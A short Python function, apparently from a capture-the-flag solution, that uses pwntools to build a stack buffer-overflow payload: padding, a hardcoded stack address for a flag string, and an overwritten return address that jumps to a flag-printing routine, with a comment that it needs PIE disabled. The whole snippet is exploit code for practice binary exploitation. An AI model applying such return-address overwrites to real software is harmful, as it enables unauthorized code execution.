def jump_to_flag():
    # This would work if PIE was disabled

    total_padding = 120
    flag_text_padding = 112

    payload = b'12345678' + b'\0'

    padding = flag_text_padding - len(payload)
    payload += b'A' * padding

    flag_text_addr = 0x7fffffffce6d # +1 byte because it may have been overwritten?
    payload += pwn.p64(flag_text_addr)

    padding = total_padding - len(payload)
    payload += b'B' * padding

    desired_addr = 0x555555555193
    payload += pwn.p64(desired_addr)

    return payload
